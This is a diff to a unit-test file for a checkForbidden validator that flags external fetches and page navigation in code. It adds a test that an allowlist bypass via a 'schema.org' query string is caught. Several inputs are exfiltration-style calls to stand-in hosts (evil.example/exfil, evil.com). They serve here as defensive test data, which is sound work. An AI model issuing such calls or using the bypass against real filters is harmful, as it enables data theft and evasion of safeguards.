@@ -19,4 +19,12 @@ describe('checkForbidden', () => {
     expect(checkForbidden(`fetch('https://evil.example/exfil')`)).toContain('external resource: https://evil.example/exfil')
     expect(checkForbidden(`window.location = 'https://evil.example'`)).toContain('navigation: window.location')
   })
+  it('does not allow schema.org bypass via query string', () => {
+    expect(checkForbidden(`fetch('https://evil.com/?ref=schema.org')`))
+      .toContain('external resource: https://evil.com/?ref=schema.org')
+  })
+  it('allows legitimate w3.org and schema.org URLs', () => {
+    expect(checkForbidden(`<!-- xmlns="http://www.w3.org/1999/xhtml" -->`)).toEqual([])
+    expect(checkForbidden(`<!-- type="https://schema.org/Person" -->`)).toEqual([])
+  })
 })
